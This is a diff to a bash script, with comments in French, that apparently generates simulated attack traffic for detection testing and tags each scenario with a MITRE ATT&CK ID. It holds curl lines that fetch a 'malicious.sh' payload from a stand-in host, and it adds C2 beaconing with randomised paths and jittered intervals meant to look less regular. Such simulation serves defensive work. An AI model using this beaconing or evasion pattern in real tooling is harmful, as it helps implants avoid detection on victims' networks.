@@ -18,7 +18,7 @@ echo "[1/4] Phishing / URL suspecte (recuperation de payload via curl)"
 START=$(now_iso)
 curl -s -m3 "http://phishing-simulated-payload.example.invalid/malicious.sh" >/dev/null 2>&1
 END=$(now_iso)
-log_scenario "phishing_url_proxy" "$START" "$END" "Recuperation de payload suspect (proxy phishing)" "haute" "Initial Access" "T1566"
+log_scenario "phishing_url_proxy" "$START" "$END" "Recuperation de payload suspect (proxy phishing)" "haute" "Command and Control" "T1105"
 sleep 3
 
 echo "[2/4] Activite PowerShell suspecte (commande encodee)"
@@ -38,11 +38,14 @@ END=$(now_iso)
 log_scenario "lateral_movement_simulated" "$START" "$END" "Connexions SSH successives avec elevation (mouvement lateral simule)" "haute" "Lateral Movement" "T1021.004"
 sleep 3
 
-echo "[4/4] C2 beaconing simule (requetes repetees vers la meme destination)"
+echo "[4/4] C2 beaconing simule (requetes repetees avec jitter, destination variable)"
 START=$(now_iso)
+PATHS=("checkin" "beacon" "poll" "sync" "hb")
 for i in 1 2 3 4 5; do
-  curl -s -m3 "http://c2-beacon-simulated.example.invalid/checkin?id=$i" >/dev/null 2>&1
-  sleep 8
+  p="${PATHS[$((RANDOM % ${#PATHS[@]}))]}"
+  curl -s -m3 "http://c2-beacon-simulated.example.invalid/${p}?id=$i&t=$(date +%s)" >/dev/null 2>&1
+  # jitter : intervalle aleatoire entre 5 et 12s, pas un pas fixe de 8s
+  sleep $((5 + RANDOM % 8))
 done
 END=$(now_iso)
 log_scenario "c2_beaconing_simulated" "$START" "$END" "Requetes repetees vers la meme destination (C2 beaconing simule)" "haute" "Command and Control" "T1071"
